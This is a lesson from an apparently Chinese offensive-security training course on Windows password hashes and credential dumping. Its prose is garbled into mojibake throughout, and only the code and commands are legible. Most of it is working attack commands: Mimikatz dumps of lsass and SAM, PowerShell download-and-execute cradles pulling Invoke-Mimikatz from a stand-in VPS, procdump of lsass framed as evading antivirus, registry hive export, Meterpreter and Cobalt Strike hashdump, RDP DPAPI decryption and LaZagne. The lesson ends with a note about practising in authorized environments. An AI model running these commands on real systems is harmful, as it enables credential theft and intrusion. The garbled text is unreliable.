# ç½‘ç»œå®‰å…¨å°±ä¸šæ¨è - P56ï¼šç¬¬20å¤©ï¼šWindowså“ˆå¸Œç®€ä»‹åŠç³»ç»Ÿç”¨æˆ·å¯†ç å‡­è¯è·å–æ•™ç¨‹ ğŸ›¡ï¸ğŸ’»

![](img/09e6f201f3da6752ebe72cf955866539_1.png)

![](img/09e6f201f3da6752ebe72cf955866539_3.png)

![](img/09e6f201f3da6752ebe72cf955866539_5.png)

## è¯¾ç¨‹æ¦‚è¿°

![](img/09e6f201f3da6752ebe72cf955866539_7.png)

![](img/09e6f201f3da6752ebe72cf955866539_9.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ Windowsç³»ç»Ÿä¸‹çš„å¯†ç å“ˆå¸ŒåŸºç¡€çŸ¥è¯†ï¼Œå¹¶æŒæ¡å¤šç§è·å–ç³»ç»Ÿç”¨æˆ·å¯†ç å‡­è¯çš„æ–¹æ³•ã€‚è¯¾ç¨‹å†…å®¹åˆ†ä¸ºä¸‰ä¸ªä¸»è¦éƒ¨åˆ†ï¼šWindowså“ˆå¸Œç®€ä»‹ã€ç³»ç»Ÿç”¨æˆ·å¯†ç å‡­è¯è·å–ä»¥åŠå…¶ä»–å‡­è¯è·å–æŠ€æœ¯ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_11.png)

![](img/09e6f201f3da6752ebe72cf955866539_13.png)

---

## ç¬¬ä¸€éƒ¨åˆ†ï¼šWindowså“ˆå¸Œç®€ä»‹

![](img/09e6f201f3da6752ebe72cf955866539_15.png)

ä¸Šä¸€èŠ‚è¯¾æˆ‘ä»¬ä»‹ç»äº†Windowsä¸»æœºçš„ä¿¡æ¯æ”¶é›†ã€‚æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹Windowsç³»ç»Ÿå¦‚ä½•å­˜å‚¨å’Œå¤„ç†ç”¨æˆ·å¯†ç ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_17.png)

### ä»€ä¹ˆæ˜¯Windowså“ˆå¸Œï¼Ÿ

Windowså“ˆå¸Œå¯ä»¥ç®€å•ç†è§£ä¸ºWindowsåŠ å¯†è¿‡çš„å¯†ç å£ä»¤ã€‚ç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç ï¼ˆä¾‹å¦‚ `admin123`ï¼‰ä¼šç»è¿‡ç‰¹å®šçš„åŠ å¯†ç®—æ³•å¤„ç†ï¼Œç”Ÿæˆä¸€ä¸²å“ˆå¸Œå€¼ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_19.png)

![](img/09e6f201f3da6752ebe72cf955866539_21.png)

Windowsç³»ç»Ÿä¸»è¦ä½¿ç”¨ä¸¤ç§å“ˆå¸Œå¤„ç†æ–¹æ³•ï¼š
*   **LMå“ˆå¸Œ (LAN Manager Hash)**ï¼šä¸€ç§è¾ƒæ—§çš„åŠ å¯†æ–¹å¼ï¼Œå­˜åœ¨å®‰å…¨ç¼ºé™·ï¼Œå¯†ç æœ€å¤§é•¿åº¦ä¸º14ä½ã€‚
*   **NTLMå“ˆå¸Œ (NT LAN Manager Hash)**ï¼šæ–°ç‰ˆWindowsç³»ç»Ÿé»˜è®¤ä½¿ç”¨çš„æ›´å®‰å…¨çš„åŠ å¯†æ–¹å¼ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_23.png)

![](img/09e6f201f3da6752ebe72cf955866539_25.png)

![](img/09e6f201f3da6752ebe72cf955866539_27.png)

**æ ¸å¿ƒå…¬å¼/æ¦‚å¿µï¼š**
*   `LM_Hash = Encrypt_LM(æ˜æ–‡å¯†ç )`
*   `NTLM_Hash = Encrypt_NTLM(æ˜æ–‡å¯†ç )`

![](img/09e6f201f3da6752ebe72cf955866539_29.png)

åœ¨å­˜å‚¨æ—¶ï¼ŒWindowså¯†ç å“ˆå¸Œé€šå¸¸ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œæ ¼å¼ä¸ºï¼š
`ç”¨æˆ·å:RID:LMå“ˆå¸Œ:NTLMå“ˆå¸Œ:::`
ä¾‹å¦‚ï¼š`Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::`

![](img/09e6f201f3da6752ebe72cf955866539_31.png)

**ç”¨æˆ·SIDä¸RIDï¼š**
æ¯ä¸ªWindowsç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆSIDï¼‰ã€‚RIDï¼ˆç›¸å¯¹æ ‡è¯†ç¬¦ï¼‰æ˜¯SIDçš„æœ€åä¸€éƒ¨åˆ†ï¼Œç”¨äºåŒºåˆ†åŒä¸€åŸŸæˆ–è®¡ç®—æœºå†…çš„ä¸åŒç”¨æˆ·ã€‚ä¾‹å¦‚ï¼Œæœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·çš„RIDé€šå¸¸æ˜¯500ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_33.png)

![](img/09e6f201f3da6752ebe72cf955866539_35.png)

### Windowsè®¤è¯åŸºç¡€

![](img/09e6f201f3da6752ebe72cf955866539_37.png)

![](img/09e6f201f3da6752ebe72cf955866539_39.png)

![](img/09e6f201f3da6752ebe72cf955866539_41.png)

![](img/09e6f201f3da6752ebe72cf955866539_43.png)

![](img/09e6f201f3da6752ebe72cf955866539_45.png)

![](img/09e6f201f3da6752ebe72cf955866539_47.png)

![](img/09e6f201f3da6752ebe72cf955866539_48.png)

Windowsç³»ç»Ÿä¸»è¦æœ‰ä¸‰ç§è®¤è¯æ–¹å¼ï¼š
1.  **æœ¬åœ°è®¤è¯**ï¼šç”¨æˆ·ç›´æ¥ç™»å½•åˆ°è®¡ç®—æœºæœ¬åœ°è´¦æˆ·ã€‚
2.  **ç½‘ç»œè®¤è¯**ï¼šç”¨æˆ·è¿œç¨‹è®¿é—®å·¥ä½œç»„å†…å…¶ä»–è®¡ç®—æœºçš„å…±äº«èµ„æºã€‚
3.  **åŸŸè®¤è¯**ï¼šç”¨æˆ·ç™»å½•åˆ°åŸŸç¯å¢ƒä¸­çš„æŸå°è®¡ç®—æœºã€‚

![](img/09e6f201f3da6752ebe72cf955866539_50.png)

![](img/09e6f201f3da6752ebe72cf955866539_51.png)

![](img/09e6f201f3da6752ebe72cf955866539_52.png)

![](img/09e6f201f3da6752ebe72cf955866539_53.png)

![](img/09e6f201f3da6752ebe72cf955866539_55.png)

![](img/09e6f201f3da6752ebe72cf955866539_56.png)

![](img/09e6f201f3da6752ebe72cf955866539_57.png)

![](img/09e6f201f3da6752ebe72cf955866539_58.png)

**æœ¬åœ°è®¤è¯æµç¨‹ç®€è¿°ï¼š**
1.  ç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ã€‚
2.  ç³»ç»Ÿå°†è¾“å…¥çš„å¯†ç è®¡ç®—æˆNTLMå“ˆå¸Œå€¼ã€‚
3.  ç³»ç»Ÿä»æœ¬åœ°çš„SAMæ•°æ®åº“æ–‡ä»¶ä¸­è¯»å–è¯¥ç”¨æˆ·å­˜å‚¨çš„å“ˆå¸Œå€¼ã€‚
4.  æ¯”å¯¹ä¸¤ä¸ªå“ˆå¸Œå€¼ï¼Œä¸€è‡´åˆ™ç™»å½•æˆåŠŸã€‚

![](img/09e6f201f3da6752ebe72cf955866539_60.png)

![](img/09e6f201f3da6752ebe72cf955866539_62.png)

![](img/09e6f201f3da6752ebe72cf955866539_64.png)

![](img/09e6f201f3da6752ebe72cf955866539_66.png)

SAMæ•°æ®åº“æ–‡ä»¶è·¯å¾„ï¼š`C:\Windows\System32\config\SAM`
è´Ÿè´£å¤„ç†å¯†ç çš„è¿›ç¨‹ï¼š`lsass.exe`

![](img/09e6f201f3da6752ebe72cf955866539_68.png)

![](img/09e6f201f3da6752ebe72cf955866539_70.png)

![](img/09e6f201f3da6752ebe72cf955866539_72.png)

![](img/09e6f201f3da6752ebe72cf955866539_74.png)

**ä½¿ç”¨Pythonç”ŸæˆNTLMå“ˆå¸Œç¤ºä¾‹ï¼š**
```python
import hashlib
def ntlm_hash(text):
    return hashlib.new('md4', text.encode('utf-16le')).hexdigest()
password = "admin123"
print(ntlm_hash(password)) # è¾“å‡ºNTLMå“ˆå¸Œå€¼
```

![](img/09e6f201f3da6752ebe72cf955866539_76.png)

---

![](img/09e6f201f3da6752ebe72cf955866539_78.png)

![](img/09e6f201f3da6752ebe72cf955866539_80.png)

![](img/09e6f201f3da6752ebe72cf955866539_82.png)

![](img/09e6f201f3da6752ebe72cf955866539_84.png)

## ç¬¬äºŒéƒ¨åˆ†ï¼šç³»ç»Ÿç”¨æˆ·å¯†ç å‡­è¯è·å–

ç†è§£äº†å“ˆå¸Œçš„åŸºæœ¬æ¦‚å¿µåï¼Œæœ¬èŠ‚æˆ‘ä»¬å°†å­¦ä¹ åç§è·å–ç³»ç»Ÿå¯†ç å“ˆå¸Œæˆ–æ˜æ–‡å‡­è¯çš„å®ç”¨æ–¹æ³•ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_86.png)

![](img/09e6f201f3da6752ebe72cf955866539_88.png)

![](img/09e6f201f3da6752ebe72cf955866539_90.png)

![](img/09e6f201f3da6752ebe72cf955866539_91.png)

![](img/09e6f201f3da6752ebe72cf955866539_92.png)

![](img/09e6f201f3da6752ebe72cf955866539_93.png)

![](img/09e6f201f3da6752ebe72cf955866539_95.png)

ä»¥ä¸‹æ˜¯è·å–ç³»ç»Ÿç”¨æˆ·å¯†ç å‡­è¯çš„åç§æ–¹æ³•ï¼š

![](img/09e6f201f3da6752ebe72cf955866539_97.png)

![](img/09e6f201f3da6752ebe72cf955866539_99.png)

![](img/09e6f201f3da6752ebe72cf955866539_101.png)

1.  **Mimikatzå·¥å…·**
    Mimikatzæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„å‡­è¯æå–å·¥å…·ã€‚å®ƒå¯ä»¥ç›´æ¥ä»`lsass.exe`è¿›ç¨‹å†…å­˜ä¸­æå–æ˜æ–‡å¯†ç å’Œå“ˆå¸Œå€¼ã€‚
    *   **éäº¤äº’å¼è·å–å“ˆå¸Œ**ï¼š`mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit`
    *   **éäº¤äº’å¼è·å–æ˜æ–‡å¯†ç **ï¼š`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`

![](img/09e6f201f3da6752ebe72cf955866539_103.png)

![](img/09e6f201f3da6752ebe72cf955866539_105.png)

![](img/09e6f201f3da6752ebe72cf955866539_107.png)

![](img/09e6f201f3da6752ebe72cf955866539_109.png)

![](img/09e6f201f3da6752ebe72cf955866539_110.png)

2.  **PowerShellè„šæœ¬åŠ è½½Mimikatz**
    é€šè¿‡PowerShellè¿œç¨‹æˆ–æœ¬åœ°åŠ è½½Mimikatzçš„PS1è„šæœ¬æ‰§è¡Œã€‚
    ```powershell
    powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://your-vps/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
    ```

3.  **PowerShellè„šæœ¬è·å–å“ˆå¸Œ**
    ä½¿ç”¨ä¸“é—¨çš„PowerShellè„šæœ¬ç›´æ¥å¯¼å‡ºå“ˆå¸Œã€‚
    ```powershell
    powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://your-vps/Get-PassHashes.ps1')"
    ```

4.  **WCE (Windows Credentials Editor)**
    å¦ä¸€æ¬¾çŸ¥åçš„å“ˆå¸Œç®¡ç†å·¥å…·ï¼Œç›´æ¥è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶å³å¯è·å–å“ˆå¸Œã€‚
    ```cmd
    wce.exe -w
    ```

![](img/09e6f201f3da6752ebe72cf955866539_112.png)

![](img/09e6f201f3da6752ebe72cf955866539_114.png)

![](img/09e6f201f3da6752ebe72cf955866539_115.png)

![](img/09e6f201f3da6752ebe72cf955866539_117.png)

![](img/09e6f201f3da6752ebe72cf955866539_119.png)

5.  **Pwdumpç³»åˆ—å·¥å…·**
    ä¾‹å¦‚Pwdump7ï¼Œè¿è¡Œåè‡ªåŠ¨å¯¼å‡ºå“ˆå¸Œåˆ°æ–‡ä»¶ã€‚
    ```cmd
    PwDump7.exe > hashes.txt
    type hashes.txt
    ```

![](img/09e6f201f3da6752ebe72cf955866539_121.png)

![](img/09e6f201f3da6752ebe72cf955866539_123.png)

6.  **Ophcrack + å½©è™¹è¡¨**
    å¦‚æœåœ¨çº¿ç½‘ç«™æ— æ³•ç ´è§£å“ˆå¸Œï¼Œå¯ä»¥ä½¿ç”¨Ophcrackå·¥å…·é…åˆå½©è™¹è¡¨è¿›è¡Œç¦»çº¿ç ´è§£ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_125.png)

![](img/09e6f201f3da6752ebe72cf955866539_127.png)

![](img/09e6f201f3da6752ebe72cf955866539_129.png)

![](img/09e6f201f3da6752ebe72cf955866539_131.png)

7.  **Procdump + Mimikatz**
    åˆ©ç”¨å¾®è½¯å®˜æ–¹å·¥å…·Procdumpå¯¼å‡º`lsass.exe`è¿›ç¨‹å†…å­˜ï¼Œå†ç”¨Mimikatzåˆ†æï¼Œå¸¸ç”¨äºç»•è¿‡æ€æ¯’è½¯ä»¶ã€‚
    ```cmd
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
    ```

![](img/09e6f201f3da6752ebe72cf955866539_133.png)

![](img/09e6f201f3da6752ebe72cf955866539_135.png)

![](img/09e6f201f3da6752ebe72cf955866539_137.png)

![](img/09e6f201f3da6752ebe72cf955866539_139.png)

![](img/09e6f201f3da6752ebe72cf955866539_141.png)

8.  **æ³¨å†Œè¡¨å¯¼å‡ºå“ˆå¸Œ**
    ä»æ³¨å†Œè¡¨ä¸­å¯¼å‡ºå­˜å‚¨å“ˆå¸Œå€¼çš„æ¡ç›®ï¼Œå†ç”¨å·¥å…·è§£æã€‚
    ```cmd
    reg save HKLM\SYSTEM system.hiv
    reg save HKLM\SAM sam.hiv
    mimikatz.exe "lsadump::sam /system:system.hiv /sam:sam.hiv" exit
    ```

![](img/09e6f201f3da6752ebe72cf955866539_143.png)

![](img/09e6f201f3da6752ebe72cf955866539_145.png)

9.  **Meterpreter (MSF) å†…ç½®æ¨¡å—**
    åœ¨è·å¾—Meterpreterä¼šè¯åï¼Œå¯ä»¥ä½¿ç”¨å†…ç½®æ¨¡å—è·å–å“ˆå¸Œã€‚
    ```msf
    meterpreter > getsystem
    meterpreter > hashdump
    # æˆ–åŠ è½½Mimikatzæ¨¡å—
    meterpreter > load mimikatz
    meterpreter > msv
    meterpreter > kerberos
    ```

![](img/09e6f201f3da6752ebe72cf955866539_147.png)

![](img/09e6f201f3da6752ebe72cf955866539_149.png)

![](img/09e6f201f3da6752ebe72cf955866539_151.png)

![](img/09e6f201f3da6752ebe72cf955866539_153.png)

![](img/09e6f201f3da6752ebe72cf955866539_155.png)

10. **Cobalt Strike å†…ç½®å‘½ä»¤**
    åœ¨Cobalt Strikeçš„Beaconä¼šè¯ä¸­ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤è·å–å“ˆå¸Œæˆ–è°ƒç”¨Mimikatzã€‚
    ```cs
    beacon> hashdump
    beacon> logonpasswords
    beacon> mimikatz sekurlsa::logonpasswords
    ```

![](img/09e6f201f3da6752ebe72cf955866539_157.png)

![](img/09e6f201f3da6752ebe72cf955866539_159.png)

![](img/09e6f201f3da6752ebe72cf955866539_161.png)

![](img/09e6f201f3da6752ebe72cf955866539_163.png)

![](img/09e6f201f3da6752ebe72cf955866539_165.png)

![](img/09e6f201f3da6752ebe72cf955866539_167.png)

![](img/09e6f201f3da6752ebe72cf955866539_169.png)

**å·¥å…·ä¸Šä¼ ä¸æ‰§è¡Œæ€è·¯ï¼ˆä»¥CS/MSFä¸ºä¾‹ï¼‰ï¼š**
å½“é€šè¿‡CSæˆ–MSFè·å¾—ä¸€ä¸ªShellåï¼Œè‹¥æƒ³ä½¿ç”¨ä¸Šè¿°ç¬¬ä¸‰æ–¹å·¥å…·ï¼ˆå¦‚`wce.exe`ï¼‰ï¼š
1.  ä½¿ç”¨`upload`å‘½ä»¤å°†å·¥å…·ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ã€‚
2.  åœ¨Shellä¸­æ‰§è¡Œè¯¥å·¥å…·ï¼Œå¹¶å°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ã€‚
3.  ä½¿ç”¨`type`æˆ–`cat`å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œæˆ–ç›´æ¥ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°åˆ†æã€‚

![](img/09e6f201f3da6752ebe72cf955866539_171.png)

![](img/09e6f201f3da6752ebe72cf955866539_173.png)

![](img/09e6f201f3da6752ebe72cf955866539_175.png)

![](img/09e6f201f3da6752ebe72cf955866539_177.png)

![](img/09e6f201f3da6752ebe72cf955866539_178.png)

![](img/09e6f201f3da6752ebe72cf955866539_180.png)

![](img/09e6f201f3da6752ebe72cf955866539_182.png)

![](img/09e6f201f3da6752ebe72cf955866539_184.png)

![](img/09e6f201f3da6752ebe72cf955866539_186.png)

---

![](img/09e6f201f3da6752ebe72cf955866539_188.png)

![](img/09e6f201f3da6752ebe72cf955866539_190.png)

![](img/09e6f201f3da6752ebe72cf955866539_192.png)

![](img/09e6f201f3da6752ebe72cf955866539_194.png)

![](img/09e6f201f3da6752ebe72cf955866539_195.png)

![](img/09e6f201f3da6752ebe72cf955866539_197.png)

![](img/09e6f201f3da6752ebe72cf955866539_198.png)

![](img/09e6f201f3da6752ebe72cf955866539_199.png)

![](img/09e6f201f3da6752ebe72cf955866539_200.png)

![](img/09e6f201f3da6752ebe72cf955866539_202.png)

## ç¬¬ä¸‰éƒ¨åˆ†ï¼šå…¶ä»–å‡­è¯è·å–æŠ€æœ¯

![](img/09e6f201f3da6752ebe72cf955866539_204.png)

![](img/09e6f201f3da6752ebe72cf955866539_206.png)

![](img/09e6f201f3da6752ebe72cf955866539_207.png)

![](img/09e6f201f3da6752ebe72cf955866539_209.png)

![](img/09e6f201f3da6752ebe72cf955866539_211.png)

![](img/09e6f201f3da6752ebe72cf955866539_212.png)

![](img/09e6f201f3da6752ebe72cf955866539_214.png)

![](img/09e6f201f3da6752ebe72cf955866539_216.png)

![](img/09e6f201f3da6752ebe72cf955866539_218.png)

é™¤äº†ç³»ç»Ÿç”¨æˆ·å¯†ç ï¼Œç³»ç»Ÿä¸­è¿˜ä¿å­˜ç€è®¸å¤šå…¶ä»–æœ‰ä»·å€¼çš„å‡­è¯ã€‚æœ¬èŠ‚æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•è·å–å®ƒä»¬ã€‚

### 1. RDPè¿æ¥è®°å½•ä¸å¯†ç è§£å¯†

![](img/09e6f201f3da6752ebe72cf955866539_220.png)

è¿œç¨‹æ¡Œé¢ï¼ˆRDPï¼‰è¿æ¥å†å²è®°å½•ä¸­å¯èƒ½ä¿å­˜ç€é€šå¾€å…¶ä»–å†…ç½‘æœºå™¨çš„å‡­æ®ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_222.png)

![](img/09e6f201f3da6752ebe72cf955866539_224.png)

![](img/09e6f201f3da6752ebe72cf955866539_226.png)

**è·å–RDPè¿æ¥è®°å½•ï¼š**
å¯ä»¥ä½¿ç”¨PowerShellè„šæœ¬è·å–ã€‚
```powershell
powershell -exec bypass -f Get-RDPConnection.ps1
```
ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢æ³¨å†Œè¡¨è·å–ï¼š
```cmd
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
```

![](img/09e6f201f3da6752ebe72cf955866539_228.png)

![](img/09e6f201f3da6752ebe72cf955866539_230.png)

![](img/09e6f201f3da6752ebe72cf955866539_232.png)

![](img/09e6f201f3da6752ebe72cf955866539_234.png)

![](img/09e6f201f3da6752ebe72cf955866539_236.png)

![](img/09e6f201f3da6752ebe72cf955866539_238.png)

![](img/09e6f201f3da6752ebe72cf955866539_240.png)

![](img/09e6f201f3da6752ebe72cf955866539_242.png)

**è§£å¯†ä¿å­˜çš„RDPå¯†ç ï¼š**
å¦‚æœç”¨æˆ·åœ¨è¿æ¥æ—¶å‹¾é€‰äº†â€œä¿å­˜å‡­æ®â€ï¼Œå¯†ç ä¼šåŠ å¯†å­˜å‚¨åœ¨ä»¥ä¸‹ä½ç½®ï¼š
`%USERPROFILE%\AppData\Local\Microsoft\Credentials\` æˆ– `%USERPROFILE%\AppData\Roaming\Microsoft\Credentials\`

![](img/09e6f201f3da6752ebe72cf955866539_244.png)

![](img/09e6f201f3da6752ebe72cf955866539_246.png)

![](img/09e6f201f3da6752ebe72cf955866539_248.png)

è§£å¯†æ­¥éª¤ï¼š
1.  ä½¿ç”¨Mimikatzåˆ—å‡ºå‡­æ®æ–‡ä»¶å¹¶è·å–å¯¹åº”çš„`GUID MasterKey`ã€‚
    ```cmd
    mimikatz.exe "dpapi::cred /in:C:\Users\[ç”¨æˆ·å]\AppData\Local\Microsoft\Credentials\[å‡­æ®æ–‡ä»¶GUID]" exit
    ```
2.  ä½¿ç”¨è·å–çš„`GUID MasterKey`æŸ¥æ‰¾å¯¹åº”çš„`MasterKey`ã€‚
    ```cmd
    mimikatz.exe "sekurlsa::dpapi" exit
    ```
3.  ä½¿ç”¨`MasterKey`è§£å¯†å‡­æ®æ–‡ä»¶ï¼Œè·å–æ˜æ–‡å¯†ç ã€‚
    ```cmd
    mimikatz.exe "dpapi::cred /in:[å‡­æ®æ–‡ä»¶è·¯å¾„] /masterkey:[MasterKey]" exit
    ```

![](img/09e6f201f3da6752ebe72cf955866539_250.png)

![](img/09e6f201f3da6752ebe72cf955866539_252.png)

![](img/09e6f201f3da6752ebe72cf955866539_254.png)

### 2. PPTP VPNå£ä»¤è·å–

![](img/09e6f201f3da6752ebe72cf955866539_256.png)

![](img/09e6f201f3da6752ebe72cf955866539_258.png)

![](img/09e6f201f3da6752ebe72cf955866539_260.png)

![](img/09e6f201f3da6752ebe72cf955866539_262.png)

å¦‚æœç›®æ ‡æœºå™¨é…ç½®äº†PPTP VPNè¿æ¥ï¼Œå¯ä»¥å°è¯•è·å–å…¶è¿æ¥å£ä»¤ã€‚

1.  VPNé…ç½®ä¿¡æ¯é€šå¸¸ä½äºï¼š`%USERPROFILE%\AppData\Roaming\Microsoft\Network\Connections\Pbk\rasphone.pbk`
2.  ä½¿ç”¨Mimikatzæå–`lsass.exe`ä¸­çš„ç§˜å¯†ï¼Œå¯èƒ½åŒ…å«VPNæ˜æ–‡å¯†ç ã€‚
    ```cmd
    mimikatz.exe "privilege::debug" "sekurlsa::vpn" exit
    ```

![](img/09e6f201f3da6752ebe72cf955866539_264.png)

![](img/09e6f201f3da6752ebe72cf955866539_266.png)

![](img/09e6f201f3da6752ebe72cf955866539_268.png)

### 3. MySQLæ•°æ®åº“å¯†ç ç ´è§£

![](img/09e6f201f3da6752ebe72cf955866539_270.png)

![](img/09e6f201f3da6752ebe72cf955866539_271.png)

åœ¨è·å–WebæœåŠ¡å™¨æƒé™åï¼Œå¯ä»¥å°è¯•è·å–MySQLæ•°æ®åº“å¯†ç ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_273.png)

1.  **å®šä½å¯†ç å“ˆå¸Œ**ï¼šMySQLç”¨æˆ·å¯†ç å“ˆå¸Œå­˜å‚¨åœ¨æ•°æ®åº“ç›®å½•çš„`user.MYD`æ–‡ä»¶ä¸­ï¼ˆè·¯å¾„é€šå¸¸ä¸º`mysql\data\mysql\`ï¼‰ã€‚
2.  **æå–å“ˆå¸Œ**ï¼šä½¿ç”¨äºŒè¿›åˆ¶ç¼–è¾‘å™¨ï¼ˆå¦‚WinHexï¼‰æ‰“å¼€`user.MYD`æ–‡ä»¶ï¼ŒæŸ¥æ‰¾é•¿å­—ç¬¦ä¸²å“ˆå¸Œå€¼ï¼ˆå½¢å¦‚`*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B`ï¼‰ã€‚
3.  **ç ´è§£å“ˆå¸Œ**ï¼š
    *   **åœ¨çº¿ç½‘ç«™**ï¼šç›´æ¥åœ¨cmd5ç­‰ç½‘ç«™æŸ¥è¯¢ã€‚
    *   **Hashcatå·¥å…·**ï¼š
        ```bash
        hashcat -m 300 -a 3 [å“ˆå¸Œå€¼] ?a?a?a?a?a?a
        # -m 300 æŒ‡å®šMySQL 4.1/5.x å“ˆå¸Œç±»å‹
        ```
    *   **John the Ripperå·¥å…·**ï¼š
        ```bash
        john --format=mysql-sha1 [åŒ…å«å“ˆå¸Œçš„æ–‡ä»¶]
        ```

### 4. å¸¸è§è½¯ä»¶å¯†ç è·å–

![](img/09e6f201f3da6752ebe72cf955866539_275.png)

![](img/09e6f201f3da6752ebe72cf955866539_277.png)

![](img/09e6f201f3da6752ebe72cf955866539_279.png)

è®¸å¤šè½¯ä»¶ä¼šå°†å¯†ç ä¿å­˜åœ¨æœ¬åœ°æˆ–æ³¨å†Œè¡¨ä¸­ã€‚å¯ä»¥ä½¿ç”¨`LaZagne`è¿™ç±»å…¨èƒ½å·¥å…·è¿›è¡ŒæŠ“å–ã€‚
```cmd
laZagne.exe all
```
è¯¥å·¥å…·æ”¯æŒè·å–æµè§ˆå™¨ã€æ•°æ®åº“å®¢æˆ·ç«¯ã€Wi-Fiã€é‚®ä»¶å®¢æˆ·ç«¯ã€Gitã€SVNç­‰å¤šç§è½¯ä»¶çš„ä¿å­˜å¯†ç ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_281.png)

![](img/09e6f201f3da6752ebe72cf955866539_283.png)

![](img/09e6f201f3da6752ebe72cf955866539_285.png)

![](img/09e6f201f3da6752ebe72cf955866539_287.png)

![](img/09e6f201f3da6752ebe72cf955866539_289.png)

![](img/09e6f201f3da6752ebe72cf955866539_291.png)

![](img/09e6f201f3da6752ebe72cf955866539_293.png)

---

![](img/09e6f201f3da6752ebe72cf955866539_295.png)

![](img/09e6f201f3da6752ebe72cf955866539_297.png)

![](img/09e6f201f3da6752ebe72cf955866539_299.png)

![](img/09e6f201f3da6752ebe72cf955866539_301.png)

![](img/09e6f201f3da6752ebe72cf955866539_303.png)

## è¯¾ç¨‹æ€»ç»“

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†ï¼š
1.  **Windowså“ˆå¸ŒåŸºç¡€**ï¼šäº†è§£äº†LMå“ˆå¸Œå’ŒNTLMå“ˆå¸Œçš„æ¦‚å¿µã€æ ¼å¼ä»¥åŠWindowsæœ¬åœ°è®¤è¯çš„åŸºæœ¬æµç¨‹ã€‚
2.  **åç§å‡­è¯è·å–æ–¹æ³•**ï¼šä»ä½¿ç”¨ç»å…¸çš„Mimikatzã€PowerShellè„šæœ¬ï¼Œåˆ°åˆ©ç”¨MSFã€CSç­‰æ¡†æ¶çš„å†…ç½®åŠŸèƒ½ï¼Œç³»ç»Ÿæ€§åœ°æŒæ¡äº†è·å–Windowsç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œå’Œæ˜æ–‡çš„å„ç§æŠ€æœ¯ã€‚
3.  **å…¶ä»–å‡­è¯æ‰©å±•**ï¼šå­¦ä¹ äº†å¦‚ä½•è·å–å’Œè§£å¯†RDPè¿æ¥å¯†ç ã€PPTP VPNå£ä»¤ï¼Œä»¥åŠå¦‚ä½•ç ´è§£MySQLæ•°æ®åº“å¯†ç å’Œè·å–å¸¸è§è½¯ä»¶ä¿å­˜çš„å¯†ç ã€‚

![](img/09e6f201f3da6752ebe72cf955866539_305.png)

æ ¸å¿ƒè¦ç‚¹åœ¨äºï¼šåœ¨Windowsç³»ç»Ÿä¸­ï¼Œå¯†ç å‡­è¯å¯èƒ½ä»¥å“ˆå¸Œå½¢å¼å­˜å‚¨åœ¨SAMæ•°æ®åº“æˆ–`lsass.exe`è¿›ç¨‹å†…å­˜ä¸­ï¼Œä¹Ÿå¯èƒ½ä»¥åŠ å¯†å½¢å¼ä¿å­˜åœ¨æ³¨å†Œè¡¨æˆ–ç‰¹å®šæ–‡ä»¶é‡Œã€‚è·å–è¿™äº›å‡­è¯æ˜¯å†…ç½‘æ¨ªå‘ç§»åŠ¨çš„å…³é”®æ­¥éª¤ã€‚è¯·å¤§å®¶åŠ¡å¿…åœ¨æˆæƒç¯å¢ƒä¸‹å¤šåŠ ç»ƒä¹ ï¼Œç†Ÿç»ƒæŒæ¡è¿™äº›å·¥å…·å’Œæ–¹æ³•çš„åŸç†ä¸ä½¿ç”¨ã€‚